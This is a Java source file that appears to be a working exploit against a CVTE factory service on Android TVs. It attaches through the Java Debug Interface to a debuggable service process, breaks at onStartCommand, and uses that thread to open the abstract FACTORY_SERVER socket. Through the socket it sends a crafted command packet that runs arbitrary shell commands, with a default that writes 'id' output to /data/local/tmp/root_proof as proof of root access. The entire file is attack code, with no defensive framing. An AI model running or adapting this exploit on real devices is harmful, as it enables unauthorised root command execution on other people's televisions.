import com.sun.jdi.*;
import com.sun.jdi.connect.*;
import com.sun.jdi.event.*;
import com.sun.jdi.request.*;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.util.*;

public class JdiBreak {
    static Method findMethod(ReferenceType t, String name, String sig) {
        for (Method m : t.methodsByName(name)) {
            if (m.signature().equals(sig)) return m;
        }
        return null;
    }

    public static void main(String[] args) throws Exception {
        int cmd = args.length > 0 ? Integer.parseInt(args[0]) : 1;
        String command = args.length > 1 ? args[1] : "id > /data/local/tmp/root_proof 2>&1";

        AttachingConnector conn = null;
        for (AttachingConnector c : Bootstrap.virtualMachineManager().attachingConnectors()) {
            if (c.name().equals("com.sun.jdi.SocketAttach")) conn = c;
        }
        Map<String, Connector.Argument> cargs = conn.defaultArguments();
        cargs.get("hostname").setValue("localhost");
        cargs.get("port").setValue("8700");
        cargs.get("timeout").setValue("5000");

        VirtualMachine vm = conn.attach(cargs);
        System.out.println("attached: " + vm.name());
        try {
            ReferenceType svc = vm.classesByName("com.cvte.factory.service.MainService").get(0);
            Method onStart = findMethod(svc, "onStartCommand", "(Landroid/content/Intent;II)I");
            if (onStart == null) { System.out.println("onStartCommand not found"); return; }
            Location loc = onStart.location();
            EventRequestManager erm = vm.eventRequestManager();
            BreakpointRequest bp = erm.createBreakpointRequest(loc);
            bp.setSuspendPolicy(EventRequest.SUSPEND_EVENT_THREAD);
            bp.enable();

            Thread trigger = new Thread(() -> {
                try {
                    Thread.sleep(1200);
                    Process p = new ProcessBuilder("adb", "-s", "<TV_IP>:5555", "shell",
                            "am", "startservice", "-n", "com.cvte.factory.service/.MainService",
                            "-a", "cvte.factory.intent.action.APIInit").inheritIO().start();
                    p.waitFor();
                } catch (Exception e) { e.printStackTrace(); }
            });
            trigger.start();

            vm.resume();
            EventSet es = vm.eventQueue().remove(15000);
            if (es == null) { System.out.println("no event"); return; }
            ThreadReference thr = null;
            for (Event ev : es) {
                System.out.println("event: " + ev);
                if (ev instanceof BreakpointEvent) thr = ((BreakpointEvent) ev).thread();
            }
            if (thr == null) { System.out.println("no breakpoint event"); vm.resume(); return; }
            System.out.println("thread: " + thr.name());

            ReferenceType sockCls = vm.classesByName("android.net.LocalSocket").get(0);
            ReferenceType nsCls = vm.classesByName("android.net.LocalSocketAddress$Namespace").get(0);
            ReferenceType addrCls = vm.classesByName("android.net.LocalSocketAddress").get(0);

            Value abs = nsCls.getValue(nsCls.fieldByName("ABSTRACT"));
            Method sockCtor = findMethod(sockCls, "<init>", "()V");
            Method addrCtor = findMethod(addrCls, "<init>", "(Ljava/lang/String;Landroid/net/LocalSocketAddress$Namespace;)V");
            Method setTimeout = findMethod(sockCls, "setSoTimeout", "(I)V");
            Method connect = findMethod(sockCls, "connect", "(Landroid/net/LocalSocketAddress;)V");
            Method getOut = findMethod(sockCls, "getOutputStream", "()Ljava/io/OutputStream;");
            Method getIn = findMethod(sockCls, "getInputStream", "()Ljava/io/InputStream;");

            ObjectReference sock;
            ObjectReference addr;
            try {
                sock = ((ClassType) sockCls).newInstance(thr, sockCtor, Collections.emptyList(), 0);
                addr = ((ClassType) addrCls).newInstance(thr, addrCtor,
                        Arrays.asList(vm.mirrorOf("FACTORY_SERVER"), abs), 0);
            } catch (InvocationException ie) {
                System.out.println("ctor exception: " + ie.exception().referenceType().name() + " msg=" + ie.getMessage());
                bp.disable(); vm.resume(); return;
            }

            try {
                sock.invokeMethod(thr, connect, Collections.singletonList(addr), 0);
                System.out.println("connected");
            } catch (InvocationException ie) {
                System.out.println("connect exception: " + ie.exception().referenceType().name() + " msg=" + ie.getMessage());
                bp.disable(); vm.resume(); return;
            }
            if (setTimeout != null) {
                try {
                    sock.invokeMethod(thr, setTimeout, Collections.singletonList(vm.mirrorOf(3000)), 0);
                } catch (InvocationException ie) {
                    System.out.println("timeout exception: " + ie.exception().referenceType().name());
                }
            }

            byte[] payload = new byte[260];
            ByteBuffer.wrap(payload).order(ByteOrder.LITTLE_ENDIAN).putInt(cmd);
            byte[] cb = command.getBytes(StandardCharsets.UTF_8);
            System.arraycopy(cb, 0, payload, 4, Math.min(cb.length, 255));

            ObjectReference out = (ObjectReference) sock.invokeMethod(thr, getOut, Collections.emptyList(), 0);
            Method write = findMethod(out.referenceType(), "write", "([B)V");
            ArrayReference payloadArr = ((ArrayType) write.argumentTypes().get(0)).newInstance(payload.length);
            List<Value> pv = new ArrayList<>();
            for (byte b : payload) pv.add(vm.mirrorOf(b));
            payloadArr.setValues(0, pv, 0, pv.size());
            out.invokeMethod(thr, write, Collections.singletonList((Value) payloadArr), 0);
            System.out.println("sent cmd=" + cmd + " payload=" + command);

            ObjectReference in = (ObjectReference) sock.invokeMethod(thr, getIn, Collections.emptyList(), 0);
            Method read = findMethod(in.referenceType(), "read", "([B)I");
            ArrayReference rbuf = ((ArrayType) read.argumentTypes().get(0)).newInstance(4096);
            try {
                Value n = in.invokeMethod(thr, read, Collections.singletonList((Value) rbuf), 0);
                int len = ((IntegerValue) n).value();
                System.out.println("read len=" + len);
                if (len > 0) {
                    StringBuilder sb = new StringBuilder();
                    List<Value> vals = rbuf.getValues(0, Math.min(len, 200));
                    for (Value v : vals) {
                        int b = ((ByteValue) v).value() & 0xff;
                        sb.append(b >= 32 && b < 127 ? (char) b : '.');
                    }
                    System.out.println("resp: " + sb);
                }
            } catch (InvocationException ie) {
                System.out.println("read exception: " + ie.exception().referenceType().name() + " " + ie.getMessage());
            }
            bp.disable();
            vm.resume();
            System.out.println("resumed");
        } finally {
            vm.dispose();
        }
    }
}
